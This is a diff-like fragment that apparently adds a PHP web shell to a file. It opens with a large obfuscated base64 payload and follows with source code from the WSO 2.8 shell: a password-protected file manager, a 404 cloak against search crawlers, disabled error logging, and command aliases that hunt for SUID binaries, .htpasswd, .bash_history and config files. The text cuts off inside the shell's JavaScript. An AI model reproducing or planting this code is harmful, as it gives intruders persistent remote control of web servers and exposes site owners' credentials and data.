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'\x29\x29\x29\x3B", "");
+<?php $color = "#df5";
+$default_action = 'FilesMan';
+$default_use_ajax = true;
+$default_charset = 'Windows-1251';
+if (!empty($_SERVER['HTTP_USER_AGENT'])) {
+    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
+    if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+        header('HTTP/1.0 404 Not Found');
+        exit;
+    }
+}
+@ini_set('error_log', NULL);
+@ini_set('log_errors', 0);
+@ini_set('max_execution_time', 0);
+@set_time_limit(0);
+if (function_exists('set_magic_quotes_runtime'))
+    @set_magic_quotes_runtime(0);
+@define('WSO_VERSION', '2.8');
+if (get_magic_quotes_gpc()) {
+    function WSOstripslashes($array) {
+        return is_array($array) ? array_map('WSOstripslashes', $array) : stripslashes($array);
+    }
+    $_POST = WSOstripslashes($_POST);
+    $_COOKIE = WSOstripslashes($_COOKIE);
+}
+function wsoLogin() {
+    die("<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value='>>'></form></pre>");
+}
+function WSOsetcookie($k, $v) {
+    $_COOKIE[$k] = $v;
+    setcookie($k, $v);
+}
+if (!empty($auth_pass)) {
+    if (isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass)) WSOsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
+    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) ]) || ($_COOKIE[md5($_SERVER['HTTP_HOST']) ] != $auth_pass)) wsoLogin();
+}
+if (strtolower(substr(PHP_OS, 0, 3)) == "win") $os = 'win';
+else $os = 'nix';
+$safe_mode = @ini_get('safe_mode');
+if (!$safe_mode) error_reporting(0);
+$disable_functions = @ini_get('disable_functions');
+$home_cwd = @getcwd();
+if (isset($_POST['c'])) @chdir($_POST['c']);
+$cwd = @getcwd();
+if ($os == 'win') {
+    $home_cwd = str_replace("\\", " / ", $home_cwd);
+    $cwd = str_replace("\\", " / ", $cwd);
+}
+if($cwd[strlen($cwd) - 1] != '/')
+    $cwd .= '/';
+ 
+if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))
+    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$default_use_ajax;
+ 
+if($os == 'win')
+    $aliases = array(
+        "ListDirectory" => "dir",
+        "Findindex . phpincurrentdir" => "dir / s / w / bindex . php",
+        "Find * config * . phpincurrentdir" => "dir / s / w / b * config * . php",
+        "Showactiveconnections" => "netstat - an",
+        "Showrunningservices" => "netstart",
+        "Useraccounts" => "netuser",
+        "Showcomputers" => "netview",
+        "ARPTable" => "arp - a",
+        "IPConfiguration" => "ipconfig / all"
+    );
+else
+    $aliases = array(
+        "Listdir" => "ls - lha",
+        "listfileattributesonaLinuxsecondextendedfilesystem" => "lsattr - va",
+        "showopenedports" => "netstat - an | grep - ilisten",
+        "processstatus" => "psaux",
+        "Find" => "",
+        "findsuid" => "find / -typef - perm - 04000 - ls",
+        "findsuidincurrentdir" => "find . -typef - perm - 04000 - ls",
+        "findsgid" => "find / -typef - perm - 02000 - ls",
+        "findsgidfilesincurrentdir" => "find . -typef - perm - 02000 - ls",
+        "findconfig . inc . php" => "find / -typef - nameconfig . inc . php",
+        "findconfig * " => "find / -typef - name\"config*\"", "find config* in current dir" => "find . -type f -name \"config*\"", "find writable folders and files" => "find / -perm -2 -ls", "find writable folders and files in current dir" => "find . -perm -2 -ls", "find service.pwd" => "find / -type f -name service.pwd", "find service.pwd files in current dir" => "find . -type f -name service.pwd", "find .htpasswd" => "find / -type f -name .htpasswd", "find .htpasswd files in current dir" => "find . -type f -name .htpasswd", "find .bash_history" => "find / -type f -name .bash_history", "find .bash_history files in current dir" => "find . -type f -name .bash_history", "find .fetchmailrc" => "find / -type f -name .fetchmailrc", "find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc", "Locate" => "", "locate httpd.conf" => "locate httpd.conf", "locate vhosts.conf" => "locate vhosts.conf", "locate proftpd.conf" => "locate proftpd.conf", "locate psybnc.conf" => "locate psybnc.conf", "locate my.conf" => "locate my.conf", "locate admin.php" => "locate admin.php", "locate cfg.php" => "locate cfg.php", "locate conf.php" => "locate conf.php", "locate config.dat" => "locate config.dat", "locate config.php" => "locate config.php", "locate config.inc" => "locate config.inc", "locate config.inc.php" => "locate config.inc.php", "locate config.default.php" => "locate config.default.php", "locate config*" => "locate config", "locate .conf" => "locate '.conf'", "locate .pwd" => "locate '.pwd'", "locate .sql" => "locate '.sql'", "locate .htpasswd" => "locate '.htpasswd'", "locate .bash_history" => "locate '.bash_history'", "locate .mysql_history" => "locate '.mysql_history'", "locate .fetchmailrc" => "locate '.fetchmailrc'", "locate backup" => "locate backup", "locate dump" => "locate dump", "locate priv" => "locate priv");
+    function wsoHeader() {
+        if (empty($_POST['charset'])) $_POST['charset'] = $GLOBALS['default_charset'];
+        global $color;
+        echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - WSO " . WSO_VERSION . "</title>
+<style>
+body{background-color:#444;color:#e1e1e1;}
+body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }
+table.info{ color:#fff;background-color:#222; }
+span,h1,a{ color: $color !important; }
+span{ font-weight: bolder; }
+h1{ border-left:5px solid $color;padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }
+div.content{ padding: 5px;margin-left:5px;background-color:#333; }
+a{ text-decoration:none; }
+a:hover{ text-decoration:underline; }
+.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
+.bigarea{ width:100%;height:300px; }
+input,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid $color; font: 9pt Monospace,'Courier New'; }
+form{ margin:0px; }
+#toolsTbl{ text-align:center; }
+.toolsInp{ width: 300px }
+.main th{text-align:left;background-color:#5e5e5e;}
+.main tr:hover{background-color:#5e5e5e}
+.l1{background-color:#444}
+.l2{background-color:#333}
+pre{font-family:Courier,Monospace;}
+</style>
+<script>
+    var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
+    var a_ = '" . htmlspecialchars(@$_POST['a']) . "'
+    var charset_ = '" . htmlspecialchars(@$_POST['charset']) . "';
+    var p1_ = '" . ((strpos(@$_POST['p1'], "
+") !== false) ? '' : htmlspecialchars($_POST['p1'], ENT_QUOTES)) . "';
+    var p2_ = '" . ((strpos(@$_POST['p2'], "
+") !== false) ? '' : htmlspecialchars($_POST['p2'], ENT_QUOTES)) . "';
+    var p3_ = '" . ((strpos(@$_POST['p3'], "
+") !== false) ? '' : htmlspecialchars($_POST['p3'], ENT_QUOTES)) . "';
+    var d = document;
+    function set(a,c,p1,p2,p3,charset) {
+        if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
+        if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
+        if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
+        if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
+        if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
+        if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
+    }
+    function g(a,c,p1,p2,p3,charset) {
+        set(a,c,p1,p2,p3,charset);
+        d.mf.submit();
+    }
+    function a(a,c,p1,p2,p3,charset) {
+        set(a,c,p1,p2,p3,charset);
+        var params = 'ajax=true';
+        for(i=0;i<d.mf.elements.length;i++)
+            params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
+        sr('" . addslashes($_SERVER['REQUEST_URI']) . "', params);
+    }
+    function sr(url, params) {
+        if (window.XMLHttpRequest)
+            req = new XMLHttpRequest();
+        else if (window.ActiveXObject)
+            req = new ActiveXObject('Microsoft.XMLHTTP');
+        if (req) {
+            req.onreadystatechange = processReqChange;
+            req.open('POST', url, true);
+            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
+            req.send(params);
+        }
+    }
